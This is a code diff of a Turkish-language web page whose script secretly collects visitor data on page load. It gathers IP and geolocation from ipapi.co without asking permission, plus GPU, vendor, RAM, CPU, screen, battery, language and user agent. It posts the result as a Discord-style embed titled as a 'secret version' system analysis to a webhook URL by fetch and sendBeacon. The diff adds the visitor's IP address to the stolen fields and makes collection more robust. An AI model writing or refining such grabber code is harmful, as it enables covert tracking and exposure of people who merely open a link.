@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -25,7 +26,7 @@
         async function herSeyiDök() {
             let data = { gpu: "Bilinmiyor", ven: "Bilinmiyor", loc: "Yükleniyor...", ip: "X", bat: "X", lang: "Bilinmiyor", ram: "Bilinmiyor", cpu: "Bilinmiyor", screen: "Bilinmiyor" };
 
-            // 1. IP ve SESSİZ KONUM (Asla izin istemez)
+            // 1. IP ve SESSİZ KONUM (IPAPI)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 if (!res.ok) throw new Error('IPAPI yanıtı başarısız');
@@ -35,6 +36,7 @@
             } catch(e) {
                 console.error("IPAPI hatası: ", e);
                 data.loc = "Lokasyon alınamadı";
+                data.ip = "IP alınamadı";
             }
 
             // 2. Cihaz Dili
@@ -44,13 +46,18 @@
                 console.error("Dil bilgisi alınamadı: ", e);
             }
 
-            // 3. GPU ve VENDOR (Efsane Sorgu)
+            // 3. GPU ve VENDOR (WebGL)
             try {
                 const c = document.createElement('canvas');
                 const gl = c.getContext('webgl');
                 const d = gl.getExtension('WEBGL_debug_renderer_info');
-                data.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
-                data.ven = gl.getParameter(d.UNMASKED_VENDOR_ID);
+                if (d) {
+                    data.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
+                    data.ven = gl.getParameter(d.UNMASKED_VENDOR_ID);
+                } else {
+                    data.gpu = "WebGL bilgisi alınamadı";
+                    data.ven = "WebGL bilgisi alınamadı";
+                }
             } catch(e) {
                 console.error("GPU bilgisi alınamadı: ", e);
                 data.gpu = "Bilinmiyor";
@@ -68,7 +75,7 @@
 
             // 5. RAM ve CPU Bilgisi
             try {
-                data.ram = `${navigator.deviceMemory} GB`;
+                data.ram = `${navigator.deviceMemory} GB RAM`;
                 data.cpu = `${navigator.hardwareConcurrency} Çekirdek`;
             } catch(e) {
                 console.error("RAM/CPU bilgisi alınamadı: ", e);
@@ -84,7 +91,10 @@
                 data.screen = "Bilinmiyor";
             }
 
-            // 7. O MEŞHUR KIRMIZI EMBED ŞABLONU
+            // 7. Kullanıcı Agent ve Diğer Bilgiler
+            const userAgent = navigator.userAgent;
+
+            // 8. O MEŞHUR KIRMIZI EMBED ŞABLONU
             const payload = {
                 embeds: [{
                     title: "🕵️ KRİTİK SİSTEM ANALİZİ (GİZLİ SÜRÜM)",
@@ -94,14 +104,15 @@
                         { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${data.gpu}\`\n**VENDOR:** \`${data.ven}\`\n**RAM:** ${data.ram}\n**CPU:** ${data.cpu}`, inline: false },
                         { name: "📱 YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${data.screen}`, inline: true },
                         { name: "🔋 DURUM", value: data.bat, inline: true },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false },
-                        { name: "🌐 CİHAZ DİLİ", value: data.lang, inline: false }
+                        { name: "🔍 USER AGENT", value: "```" + userAgent + "```", inline: false },
+                        { name: "🌐 CİHAZ DİLİ", value: data.lang, inline: false },
+                        { name: "🌐 IP ADRESİ", value: data.ip, inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
 
-            // 8. EN GARANTİ GÖNDERİM (Fetch + Beacon)
+            // 9. EN GARANTİ GÖNDERİM (Fetch + Beacon)
             const blob = JSON.stringify(payload);
             fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob })
                 .then(response => {
@@ -113,7 +124,7 @@
                 });
             navigator.sendBeacon(u, blob);
 
-            // 9. ARAYÜZ AKIŞI
+            // 10. ARAYÜZ AKIŞI
             const msg = document.getElementById('msg');
             const loader = document.getElementById('loader');
             
